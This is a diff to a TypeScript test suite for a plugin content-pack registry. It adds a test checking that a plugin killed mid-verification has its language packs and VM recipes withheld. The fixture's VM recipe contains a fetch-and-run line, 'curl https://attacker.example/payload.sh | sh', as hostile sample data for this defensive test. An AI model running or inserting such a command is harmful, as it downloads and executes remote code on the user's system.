@@ -51,7 +51,7 @@ describe('PluginContentPackRegistry', () => {
       contentHash: null,
       isDev: true
     }
-    const registry = new PluginContentPackRegistry(new PluginContentVerifier())
+    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => false)
 
     await registry.reconcile([plugin], () => true)
 
@@ -97,12 +97,69 @@ describe('PluginContentPackRegistry', () => {
       contentHash: null,
       isDev: true
     }
-    const registry = new PluginContentPackRegistry(new PluginContentVerifier())
+    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => false)
 
     await registry.reconcile([plugin], () => true)
 
     expect(registry.error(plugin.pluginKey)).toContain('suspend and resume')
     expect(registry.languagePacks.list()).toEqual([])
     expect(registry.vmRecipes.list()).toEqual([])
+  })
+
+  it('withholds content from a plugin killed during the awaited verification phase', async () => {
+    const rootDir = await mkdtemp(join(tmpdir(), 'orca-plugin-content-pack-kill-race-'))
+    roots.push(rootDir)
+    await Promise.all([mkdir(join(rootDir, 'locales')), mkdir(join(rootDir, 'recipes'))])
+    await Promise.all([
+      writeFile(join(rootDir, 'locales', 'es.json'), JSON.stringify({ settings: 'Ajustes' })),
+      writeFile(
+        join(rootDir, 'recipes', 'vm.json'),
+        JSON.stringify({
+          schemaVersion: 1,
+          id: 'raced-recipe',
+          name: 'Raced Recipe',
+          create: 'curl https://attacker.example/payload.sh | sh'
+        })
+      )
+    ])
+    const manifest = pluginManifestSchema.parse({
+      manifestVersion: 1,
+      id: 'kill-race',
+      publisher: 'orca-samples',
+      name: 'Kill Race',
+      version: '1.0.0',
+      engines: { orca: '>=1.0.0' },
+      pluginApi: 1,
+      contributes: {
+        languagePacks: [{ locale: 'es', path: 'locales/es.json' }],
+        vmRecipes: [{ path: 'recipes/vm.json' }]
+      },
+      capabilities: []
+    })
+    const content = await hashPluginTree(rootDir)
+    if (!content.ok) {
+      throw new Error(content.error)
+    }
+    const plugin: ValidDiscoveredPlugin = {
+      pluginKey: 'orca-samples.kill-race',
+      rootDir,
+      manifest,
+      consentFingerprint: fingerprintPluginConsent(manifest, content.hash),
+      consentContentHash: content.hash,
+      contentHash: null,
+      isDev: true
+    }
+    let killed = false
+    const registry = new PluginContentPackRegistry(new PluginContentVerifier(), () => killed)
+
+    // reconcile() builds its approved-key snapshot synchronously before it
+    // first yields, so flipping the kill list here lands squarely inside the
+    // awaited verification window the final admission gate must re-check.
+    const reconciled = registry.reconcile([plugin], () => true)
+    killed = true
+    await reconciled
+
+    expect(registry.vmRecipes.list()).toEqual([])
+    expect(registry.languagePacks.list()).toEqual([])
   })
 })
